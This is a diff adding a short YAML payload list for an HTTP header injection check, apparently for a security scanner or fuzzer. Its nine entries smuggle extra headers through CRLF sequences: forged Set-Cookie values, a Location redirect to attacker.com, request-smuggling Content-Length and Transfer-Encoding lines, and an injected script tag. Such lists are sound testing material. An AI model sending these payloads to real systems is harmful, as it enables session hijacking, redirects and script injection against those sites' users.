@@ -1,0 +1,13 @@
+name: "HTTP Header Injection"
+type: "header_injection"
+severity: "low"
+payloads:
+  - "X-Forwarded-For: 127.0.0.1\r\nSet-Cookie: sessionId=maliciousSessionId"
+  - "X-Forwarded-Host: malicious.com\r\nLocation: http://attacker.com"
+  - "X-Forwarded-For: 192.168.1.1\r\nContent-Length: 0\r\n\r\n"
+  - "Host: victim.com\r\nTransfer-Encoding: chunked\r\n\r\n"
+  - "Referer: http://attacker.com\r\nSet-Cookie: evilCookie"
+  - "X-Original-URL: /malicious-path\r\nContent-Type: application/x-www-form-urlencoded"
+  - "User-Agent: Mozilla/5.0\r\nSet-Cookie: admin=true"
+  - "X-Custom-Header: test\r\nCache-Control: no-cache"
+  - "Content-Type: text/html\r\nContent-Length: 1000\r\n\r\n<script>alert('Injected')</script>"
